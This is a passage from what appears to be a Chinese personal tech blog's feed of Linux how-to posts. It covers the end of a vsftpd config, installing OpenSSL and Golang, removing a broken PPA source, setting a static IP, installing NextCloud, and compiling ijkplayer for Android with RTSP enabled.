service.</span><br><span class="line">104 #</span><br><span class="line">105 # You may specify a file of disallowed anonymous e-mail addresses. Apparently</span><br><span class="line">106 # useful for combatting certain DoS attacks.</span><br><span class="line">107 #deny_email_enable=YES</span><br><span class="line">108 # (default follows)</span><br><span class="line">109 #banned_email_file=/etc/vsftpd.banned_emails</span><br><span class="line">110 #</span><br><span class="line">111 # You may restrict local users to their home directories.  See the FAQ for</span><br><span class="line">112 # the possible risks in this before using chroot_local_user or</span><br><span class="line">113 # chroot_list_enable below.</span><br><span class="line">114 #chroot_local_user=YES</span><br><span class="line">115 #</span><br><span class="line">116 # You may specify an explicit list of local users to chroot() to their home</span><br><span class="line">117 # directory. If chroot_local_user is YES, then this list becomes a list of</span><br><span class="line">118 # users to NOT chroot().</span><br><span class="line">119 # (Warning! chroot'ing can be very dangerous. If using chroot, make sure that</span><br><span class="line">120 # the user does not have write access to the top level directory within the</span><br><span class="line">121 # chroot)</span><br><span class="line">122 #chroot_local_user=YES</span><br><span class="line">123 #chroot_list_enable=YES</span><br><span class="line">124 # (default follows)</span><br><span class="line">125 #chroot_list_file=/etc/vsftpd.chroot_list</span><br><span class="line">126 #</span><br><span class="line">127 # You may activate the "-R" option to the builtin ls. This is disabled by</span><br><span class="line">128 # default to avoid remote users being able to cause excessive I/O on large</span><br><span class="line">129 # sites. However, some broken FTP clients such as "ncftp" and "mirror" assume</span><br><span class="line">130 # the presence of the "-R" option, so there is a strong case for enabling it.</span><br><span class="line">131 #ls_recurse_enable=YES</span><br><span class="line">132 #</span><br><span class="line">133 # Customization</span><br><span class="line">134 #</span><br><span class="line">135 # Some of vsftpd's settings don't fit the filesystem layout by</span><br><span class="line">136 # default.</span><br><span class="line">137 #</span><br><span class="line">138 # This option should be the name of a directory which is empty.  Also, the</span><br><span class="line">139 # directory should not be writable by the ftp user. This directory is used</span><br><span class="line">140 # as a secure chroot() jail at times vsftpd does not require filesystem</span><br><span class="line">141 # access.</span><br><span class="line">142 secure_chroot_dir=/var/run/vsftpd/empty</span><br><span class="line">143 #</span><br><span class="line">144 # This string is the name of the PAM service vsftpd will use.</span><br><span class="line">145 pam_service_name=vsftpd</span><br><span class="line">146 #</span><br><span class="line">147 # This option specifies the location of the RSA certificate to use for SSL</span><br><span class="line">148 # encrypted connections.</span><br><span class="line">149 rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</span><br><span class="line">150 rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</span><br><span class="line">151 ssl_enable=NO</span><br><span class="line">152 </span><br><span class="line">153 #</span><br><span class="line">154 # Uncomment this to indicate that vsftpd use a utf8 filesystem.</span><br><span class="line">155 #utf8_filesystem=YES</span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/hhuai/archive/2011/02/12/1952647.html" target="_blank" rel="noopener">注释的详细描述</a></p>
<p><a href="https://www.linuxprobe.com/chapter-11.html" target="_blank" rel="noopener">扩展阅读:《Redhat使用Vsftpd服务传输文件》</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu 16.04 LTS安装新版OpenSSL</title>
    <url>/Linux/Ubuntu%2016.04%20LTS%E5%AE%89%E8%A3%85%E6%96%B0%E7%89%88OpenSSL/</url>
    <content><![CDATA[<blockquote>
<p>apt install openssl 版本太旧，用源码安装新版本。</p>
</blockquote>
<p>【<a href="https://www.openssl.org/source/" target="_blank" rel="noopener">OpenSSL官网下载新版源码</a>】，这里以 <code>2021-Mar-25 13:41:15     openssl-1.1.1k.tar.gz</code> 为例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget https://www.openssl.org/<span class="built_in">source</span>/openssl-1.1.1k.tar.gz</span><br><span class="line">$ tar -zxvf openssl-1.1.1k.tar.gz</span><br><span class="line">$ sudo ./config</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line"><span class="comment"># 将旧版本的openssl进行备份</span></span><br><span class="line">$ sudo mv /usr/bin/openssl /usr/bin/openssl.old</span><br><span class="line"><span class="comment"># 将新版本的openssl进行软链接</span></span><br><span class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/bin/openssl /usr/bin/openssl</span><br><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line">$ ldconfig</span><br><span class="line">$ openssl version</span><br><span class="line">OpenSSL 1.1.1k  25 Mar 2021</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu 18.04 LTS 安装Golang</title>
    <url>/Linux/Ubuntu%2018.04%20LTS%20%E5%AE%89%E8%A3%85Golang/</url>
    <content><![CDATA[<h2 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install golang-go</span><br><span class="line">$ go version</span><br><span class="line">go version go1.10.1 linux/amd64</span><br></pre></td></tr></table></figure>
<h2 id="最新版"><a href="#最新版" class="headerlink" title="最新版"></a>最新版</h2><p><a href="https://golang.org" target="_blank" rel="noopener">【golang.org】</a> 是无法访问的，<a href="https://golang.google.cn" target="_blank" rel="noopener">【golang.google.cn】</a> 可以下载最新版本 <a href="https://golang.google.cn/dl/" target="_blank" rel="noopener">【v1.12.6】</a>，<a href="https://golang.google.cn/doc/install" target="_blank" rel="noopener">【安装文档在这里】</a> 。</p>
<p>以下是翻译:</p>
<blockquote>
<ol>
<li>下载，选择合适的版本</li>
<li>解压到 /usr/local, creating a Go tree in /usr/local/go. 例如:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li>加入 <code>/usr/local/go/bin</code> 环境变量. 可以加入到 <code>/etc/profile</code> 或者 <code>$HOME/.profile</code>:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; export PATH=$PATH:/usr/local/go/bin</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="4">
<li>使变量生效 <code>source $HOME/.profile.</code> </li>
</ol>
</blockquote>
<p>安装<a href="https://golang.google.cn/dl/" target="_blank" rel="noopener">【v1.12.6】</a>示例<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">$ sudo wget https://dl.google.com/go/go1.12.6.linux-amd64.tar.gz</span><br><span class="line">$ sudo tar -xzf go1.12.6.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line">$ vim ~/.profile</span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/samwen/golangworks </span><br><span class="line"><span class="built_in">export</span> GOBIN=<span class="variable">$GOPATH</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>/bin</span><br><span class="line">$ <span class="built_in">source</span> ~/.profile</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$GOBIN</span></span><br><span class="line">/home/samwen/golangworks/bin</span><br><span class="line">$ go version</span><br><span class="line">go version go1.12.6 linux/amd64</span><br></pre></td></tr></table></figure></p>
<p>写个demo试试</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/golangworks</span><br><span class="line">$ mkdir -p src/demo</span><br><span class="line">$ <span class="built_in">cd</span> src/demo</span><br><span class="line">$ vim hello.go</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import <span class="string">"fmt"</span></span><br><span class="line">func <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello Golang"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">$ go run hello.go</span><br><span class="line">Hello Golang</span><br><span class="line"><span class="comment"># build可执行文件（build在任何目录都可以执行）</span></span><br><span class="line">$ go build hello.go</span><br><span class="line">$ ls</span><br><span class="line">hello hello.go</span><br><span class="line">$ ./hello</span><br><span class="line">Hello Golang</span><br><span class="line"><span class="comment"># install 必须在 GOPATH 下，可执行文件在$GOPATH/bin</span></span><br><span class="line">$ go install hello.go</span><br><span class="line">$ ../../bin/demo </span><br><span class="line">Hello Golang</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 删除PPA源</title>
    <url>/Linux/Ubuntu%20%E5%88%A0%E9%99%A4PPA%E6%BA%90/</url>
    <content><![CDATA[<h2 id="添加一个PPA源"><a href="#添加一个PPA源" class="headerlink" title="添加一个PPA源"></a>添加一个PPA源</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:user/ppa-name</span><br></pre></td></tr></table></figure>
<h2 id="PPA源失效"><a href="#PPA源失效" class="headerlink" title="PPA源失效"></a>PPA源失效</h2><p>如mongodb的源失效，每次 <code>apt update</code> 都会有错误提示。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># apt-get update         </span></span><br><span class="line">Ign:7 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 InRelease                    </span><br><span class="line">Get:8 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release [3,457 B]</span><br><span class="line">Get:9 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release.gpg [801 B]</span><br><span class="line">Err:9 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release.gpg</span><br><span class="line">  The following signatures were invalid: KEYEXPIRED 1544811256</span><br><span class="line">Fetched 329 kB <span class="keyword">in</span> 5s (60.8 kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release: The following signatures were invalid: KEYEXPIRED 1544811256</span><br><span class="line">W: Failed to fetch https://repo.mongodb.org/apt/ubuntu/dists/xenial/mongodb-org/3.6/Release.gpg  The following signatures were invalid: KEYEXPIRED 1544811256</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure></p>
<h2 id="删除PPA源"><a href="#删除PPA源" class="headerlink" title="删除PPA源"></a>删除PPA源</h2><p>进入 <code>/etc/apt/sources.list.d/</code> 目录删除相关文件即可<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># cd /etc/apt/sources.list.d/</span></span><br><span class="line">root@bogon:/etc/apt/sources.list.d<span class="comment"># ls</span></span><br><span class="line">djcj-hybrid-trusty.list                               kirillshkrogalev-ffmpeg-next-trusty.list.save  mongodb-org-3.6.list.save              openjdk-r-ppa-trusty.list.save</span><br><span class="line">djcj-hybrid-trusty.list.distUpgrade                   mongodb-org-3.4.list                           nginx-ubuntu-stable-xenial.list        rabbitmq.list</span><br><span class="line">djcj-hybrid-trusty.list.save                          mongodb-org-3.4.list.distUpgrade               nginx-ubuntu-stable-xenial.list.save   rabbitmq.list.distUpgrade</span><br><span class="line">kirillshkrogalev-ffmpeg-next-trusty.list              mongodb-org-3.4.list.save                      openjdk-r-ppa-trusty.list              rabbitmq.list.save</span><br><span class="line">kirillshkrogalev-ffmpeg-next-trusty.list.distUpgrade  mongodb-org-3.6.list                           openjdk-r-ppa-trusty.list.distUpgrade</span><br><span class="line">root@bogon:/etc/apt/sources.list.d<span class="comment"># </span></span><br><span class="line">root@bogon:/etc/apt/sources.list.d<span class="comment"># </span></span><br><span class="line">root@bogon:/etc/apt/sources.list.d<span class="comment"># </span></span><br><span class="line">root@bogon:/etc/apt/sources.list.d<span class="comment"># rm mongodb-org-3.*</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu,PPA</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 18.04~20.04配置静态IP</title>
    <url>/Linux/Ubuntu%2018.04%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81IP/</url>
    <content><![CDATA[<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看IP信息</span></span><br><span class="line">$ ip addr</span><br><span class="line"></span><br><span class="line">$ sudo vim /etc/netplan/50-cloud-init.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># This file is generated from information provided by</span></span><br><span class="line"><span class="comment"># the datasource.  Changes to it will not persist across an instance.</span></span><br><span class="line"><span class="comment"># To disable cloud-init's network configuration capabilities, write a file</span></span><br><span class="line"><span class="comment"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class="line"><span class="comment"># network: &#123;config: disabled&#125;</span></span><br><span class="line">network:</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:</span><br><span class="line">            dhcp4: <span class="literal">false</span></span><br><span class="line">            addresses: [192.168.0.66/24]</span><br><span class="line">            optional: <span class="literal">true</span></span><br><span class="line">            gateway4: 192.168.0.1</span><br><span class="line">            nameservers:</span><br><span class="line">                addresses: [8.8.8.8,4.4.4.4]</span><br><span class="line">    version: 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应用修改</span></span><br><span class="line">$ sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 安装 NextCloud 服务</title>
    <url>/Linux/Ubuntu%20%E5%AE%89%E8%A3%85%20NextCloud%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-122-generic x86_64)</span><br><span class="line"></span><br><span class="line">cn@cnserver:~$ sudo apt install snapd</span><br><span class="line">[sudo] password for cn: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">snapd is already the newest version (2.47.1+18.04).</span><br><span class="line">snapd set to manually installed.</span><br><span class="line">The following packages were automatically installed and are no longer required:</span><br><span class="line">  aufs-tools cgroupfs-mount containerd.io docker-ce-cli libdumbnet1 libltdl7 pigz</span><br><span class="line">Use &apos;sudo apt autoremove&apos; to remove them.</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">cn@cnserver:~$ </span><br><span class="line">cn@cnserver:~$ </span><br><span class="line">cn@cnserver:~$ </span><br><span class="line">cn@cnserver:~$ sudo snap install nextcloud</span><br><span class="line">nextcloud 20.0.1snap1 from Nextcloud✓ installed</span><br></pre></td></tr></table></figure>
<p>安装完就启动了，默认端口是80，访问IP:80即可。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>NextCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 编译 ijplayer</title>
    <url>/Linux/Ubuntu%20%E7%BC%96%E8%AF%91%20ijplayer/</url>
    <content><![CDATA[<p>由于项目<a href="https://github.com/bilibili/ijkplayer" target="_blank" rel="noopener">【ijkplayer】</a>提供编译好的库没有支持RTSP，而ijkplayer这个项目比较强大之处就是可以根据需要进行裁剪编译，所以我要自己编译一次Android版本，开启RTSP协议。</p>
<h2 id="一、软件环境"><a href="#一、软件环境" class="headerlink" title="一、软件环境"></a>一、软件环境</h2><ol>
<li>Ubuntu16.04 Server</li>
<li>Android SDK</li>
<li>NDK（不要安装最新的版本，14b版本能用）和cmake</li>
<li>ijkplayer-k0.8.8 (commit cced91e3ae3730f5c63f3605b00d25eafcf5b97b)</li>
<li>其他一些编译c的环境，系统本身就有，就不一样列出。</li>
</ol>
<p>编译所需软件大概有这些，引用参考文章的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt install vim openssh-server git curl wget tar unzip</span><br><span class="line">$ sudo apt install build-essential openjdk-8-jdk yasm python</span><br></pre></td></tr></table></figure></p>
<h2 id="二、配置环境变量"><a href="#二、配置环境变量" class="headerlink" title="二、配置环境变量"></a>二、配置环境变量</h2><p>参考<a href="../../Android/Android Linux命令行环境变量配置">【Android Linux命令行环境变量配置】</a> ，配置：</p>
<ul>
<li>android sdk</li>
<li>android ndk</li>
<li>java</li>
</ul>
<h2 id="三、下载ijplayer源码"><a href="#三、下载ijplayer源码" class="headerlink" title="三、下载ijplayer源码"></a>三、下载ijplayer源码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bilibili/ijkplayer.git</span><br><span class="line"></span><br><span class="line"><span class="comment">#加速</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com.cnpmjs.org/bilibili/ijkplayer.git</span><br></pre></td></tr></table></figure>
<h2 id="四、初始化"><a href="#四、初始化" class="headerlink" title="四、初始化"></a>四、初始化</h2><p>先编辑 <code>init_android.sh</code> 、 <code>init-android-libyuv.sh</code> 、<code>init-android-libyuv.sh</code> 和 <code>init-android-soundtouch.sh</code>脚本，修改’github.com’ 为 ‘github.com.cnpmjs.org’，否则很慢，下载不了。<br>如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#IJK_FFMPEG_UPSTREAM=https://github.com/Bilibili/FFmpeg.git</span><br><span class="line">#IJK_FFMPEG_FORK=https://github.com/Bilibili/FFmpeg.git</span><br><span class="line"></span><br><span class="line">IJK_FFMPEG_UPSTREAM=https://github.com.cnpmjs.org/Bilibili/FFmpeg.git</span><br><span class="line">IJK_FFMPEG_FORK=https://github.com.cnpmjs.org/Bilibili/FFmpeg.git</span><br></pre></td></tr></table></figure></p>
<p><a href="https://gitee.com/samwen2019/ijkplayer/commit/3222c88d13f20f8ebf7300963743752c30fbde1b" target="_blank" rel="noopener">【修改的commit的代码】</a></p>
<p>执行<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./init_android.sh</span><br></pre></td></tr></table></figure></p>
<h2 id="五、修改配置"><a href="#五、修改配置" class="headerlink" title="五、修改配置"></a>五、修改配置</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim config/module-lite.sh</span><br></pre></td></tr></table></figure>
<p>默认支持的协议<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocols"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=async"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=bluray"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=concat"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=crypto"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=ffrtmpcrypt"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=ffrtmphttp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=gopher"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=icecast"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=librtmp*"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=libssh"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=md5"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=mmsh"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=mmst"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=rtmp*"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=rtmp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=rtmpt"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=rtp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=sctp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=srtp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=subfile"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --disable-protocol=unix"</span></span><br></pre></td></tr></table></figure></p>
<p>注释行<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#export COMMON_FF_CFG_FLAGS="$COMMON_FF_CFG_FLAGS --disable-protocol=rtp"</span></span><br></pre></td></tr></table></figure></p>
<p>加入行：RTSP协议<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=rtp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-demuxer=rtsp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-protocol=tcp"</span></span><br><span class="line"><span class="built_in">export</span> COMMON_FF_CFG_FLAGS=<span class="string">"<span class="variable">$COMMON_FF_CFG_FLAGS</span> --enable-demuxer=sdp"</span></span><br></pre></td></tr></table></figure></p>
<p><a href="https://gitee.com/samwen2019/ijkplayer/commit/6fe09b707cf0feb0e4b7ec96f83cc818c3ed9ae4" target="_blank" rel="noopener">【commit代码】</a></p>
<p>替换module<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> config/</span><br><span class="line">$ cp module.sh module.sh.bak</span><br><span class="line">$ rm module.sh</span><br><span class="line">$ ln -s module-lite.sh module.sh</span><br></pre></td></tr></table></figure></p>
<h2 id="六、开始编译"><a href="#六、开始编译" class="headerlink" title="六、开始编译"></a>六、开始编译</h2><ol>
<li><p>编译ffmpeg（耗时较长）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ijkplayer/android/contrib</span><br><span class="line">$ ./compile-ffmpeg.sh clean</span><br><span class="line">$ ./compile-ffmpeg.sh all</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译jikplayer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./compile-ijk.sh all</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功<br>so文件，在项目的libs目录下，如果是开发机上编译，可以直接用Android Studio打开编译后的example项目。<br>由于我是在服务器上编译，所以，我要下载编译好的so文件，如armv7a，路径是：<code>ijkplayer/android/ijkplayer/ijkplayer-armv7a/src/main/libs</code></p>
</li>
<li><p>拷贝so文件</p>
<p> 将所有平台的文件都拷贝到 <code>/data/ijk-libs-file</code> 目录下：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ijkplayer/android/ijkplayer</span><br><span class="line">$ ls</span><br><span class="line">build.gradle  gradle.properties  ijkplayer-arm64   ijkplayer-example  ijkplayer-x86     tools</span><br><span class="line">cp-libs.sh    gradlew            ijkplayer-armv5   ijkplayer-exo      ijkplayer-x86_64</span><br><span class="line">gradle        gradlew.bat        ijkplayer-armv7a  ijkplayer-java     settings.gradle</span><br><span class="line"></span><br><span class="line">$ cp -r ijkplayer-armv5/src/main/libs/armeabi/ /data/ijk-libs-file</span><br><span class="line">$ cp -r ijkplayer-arm64/src/main/libs/arme64 /data/ijk-libs-file</span><br><span class="line">$ cp -r ijkplayer-armv7a/src/main/libs/armeabi-v7a/ /data/ijk-libs-file</span><br><span class="line">$ cp -r ijkplayer-x86/src/main/libs/x86/ /data/ijk-libs-file</span><br><span class="line">$ cp -r ijkplayer-x86_64/src/main/libs/x86_64/ /data/ijk-libs-file</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="七、错误和解决"><a href="#七、错误和解决" class="headerlink" title="七、错误和解决"></a>七、错误和解决</h2><ol>
<li><p>NDK版本问题</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sh compile-ffmpeg.sh clean</span><br><span class="line">$ sh compile-ffmpeg.sh all</span><br><span class="line">====================</span><br><span class="line">[*] check archs</span><br><span class="line">====================</span><br><span class="line">FF_ALL_ARCHS = armv5 armv7a arm64 x86 x86_64</span><br><span class="line">FF_ACT_ARCHS = armv5 armv7a arm64 x86 x86_64</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">[*] check env armv5</span><br><span class="line">====================</span><br><span class="line">FF_ARCH=armv5</span><br><span class="line">FF_BUILD_OPT=</span><br><span class="line"></span><br><span class="line">--------------------</span><br><span class="line">[*] make NDK standalone toolchain</span><br><span class="line">--------------------</span><br><span class="line">build on Linux x86_64</span><br><span class="line">ANDROID_NDK=/usr/<span class="built_in">local</span>/androidsdk/ndk/21.3.6528147</span><br><span class="line">IJK_NDK_REL=21.3.6528147</span><br><span class="line">You need the NDKr10e or later</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#要求NDK版本大于10，但这里是21。</span></span><br><span class="line">vim android/contrib$ vim tools/<span class="keyword">do</span>-detect-env.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 71行加入: |21*</span></span><br><span class="line">70           <span class="keyword">case</span> <span class="string">"<span class="variable">$IJK_NDK_REL</span>"</span> <span class="keyword">in</span></span><br><span class="line">71              11*|12*|13*|14*|21*)</span><br></pre></td></tr></table></figure>
<p> 重新编译可以跳过这个错误，但是出现 “ERROR: Failed to create toolchain.”，还是老老实实把NDK版本改为 12/13/14其中一个吧。<br><a href="https://dl.google.com/android/repository/android-ndk-r14b-linux-x86_64.zip?hl=zh_cn" target="_blank" rel="noopener">【下载链接：Android NDK，修订版 14b（2017 年 3 月）Linux 64 位 (x86)】</a></p>
</li>
<li><p>Android 11 64位真机播放网络视频闪退<br><strong>问题</strong><br>在64位Android11机器上播放网络视频闪退，本地视频不会闪退，模拟器不会闪退。<br><strong>原因</strong><br><a href="https://github.com/bilibili/ijkplayer/issues/5206" target="_blank" rel="noopener">【ijkplayer issues/5206】</a>里的开发者分析了，是ffmpeg库ff_ffplay.c里面触发了以上Android11的标志问题。<br><a href="https://source.android.google.cn/devices/tech/debug/tagged-pointers" target="_blank" rel="noopener">【Android 11 适配问题】</a>：从 Android 11 开始，对于 64 位进程，所有堆分配都具有一个由实现定义的标记，该标记在具有对 ARM Top-byte Ignore (TBI) 的内核支持的设备上的指针顶部字节中设置。在回收期间检查该标记时，任何修改此标记的应用都会被终止。对于未来支持 ARM 内存标记扩展 (MTE) 的硬件来说，这是必需的。<br><strong>缓解办法</strong><br><code>AndroidManifest.xml</code> 文件中添加以下内容：<br><code>&lt;application android:allowNativeHeapPointerTagging=&quot;false&quot;&gt;</code><br><strong>彻底解决办法</strong><br>要彻底解决这个问题，得解决改ffmpeg的<code>ff_ffplay.c</code>，不过ijkplayer的开发者已经修复这个问题，我们升级一下ffmpeg的版本即可，参考下一节【升级FFmpeg4.0】。</p>
</li>
</ol>
<h2 id="八、升级FFmpeg4-0"><a href="#八、升级FFmpeg4-0" class="headerlink" title="八、升级FFmpeg4.0"></a>八、升级FFmpeg4.0</h2><ol>
<li><p>修改ffmpeg版本</p>
